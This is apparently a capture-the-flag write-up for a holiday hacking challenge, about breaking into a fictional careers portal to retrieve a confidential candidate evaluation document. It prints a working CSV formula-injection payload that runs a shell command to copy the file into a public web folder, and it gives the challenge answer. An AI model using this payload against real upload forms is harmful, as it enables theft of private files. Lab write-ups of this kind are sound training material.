---
layout: objective
title: "HR Incident Response"
#date: 2018-12-03
number: "7"
#image: "obj.2/obj.2.challenge.md"

images: []
question: "Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the website and fetch the document C:\\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with K. For hints on achieving this objective, please visit Sparkle Redberry and help her with the Dev Ops Fail Cranberry Pi terminal challenge."
images: ["1.png","2.png","answer.png","question.png"]
narrative: "5"
elf-name: "Sparkle Redberry"
elf-terminal: "Dev Ops Fail"
elf-directory: "sparkle"
tags: [sample post, readability, test]
comments: false
image-dir: /assets/img/objectives/7
links: ["https://careers.kringlecastle.com/"]
answer: "Fancy Beaver "
---


The link takes us to the career website.
<figure>
	<img src="/assets/img/objectives/7/1.png">
	<figcaption>Career Site</figcaption>
</figure>

Entering a dummy CSV, I find this error message

<figure>
	<img src="/assets/img/objectives/7/2.png">
	<figcaption>Error Message</figcaption>
</figure>

I crafted a command that would copy the file to the publically accessible area:

```
=cmd|'/c copy c:/\candidate_evaluation.docx c:\careerportal\resources\public\stolen.docx'!A1
```

<figure>
	<img src="/assets/img/objectives/7/3.png">
	<figcaption>Error Message</figcaption>
</figure>

It shows the Job Applicant who starts with "k"
<figure>
	<img src="/assets/img/objectives/7/4.png">
</figure>
<figure>
	<img src="/assets/img/objectives/7/5.png">
	<figcaption>The Applicant</figcaption>
</figure>
